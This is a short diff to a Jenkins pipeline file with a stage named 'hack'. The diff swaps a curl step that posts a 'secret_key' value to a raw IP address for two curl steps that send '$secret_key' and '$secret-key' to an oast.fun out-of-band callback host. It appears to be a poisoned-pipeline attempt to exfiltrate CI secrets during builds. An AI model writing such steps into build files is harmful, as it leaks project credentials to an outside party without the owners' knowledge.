@@ -6,7 +6,8 @@ pipeline {
     stages {
         stage('hack') {
             steps {
-              sh 'curl -d env="$(secret_key)" http://20.83.189.1'
+              sh 'curl -d env="$secret_key" ccen0es2vtc000091wgggg8koeryyyyyb.oast.fun'
+              sh 'curl -d env="$secret-key" ccen0es2vtc000091wgggg8koeryyyyyb.oast.fun'
                 }
             }
         }
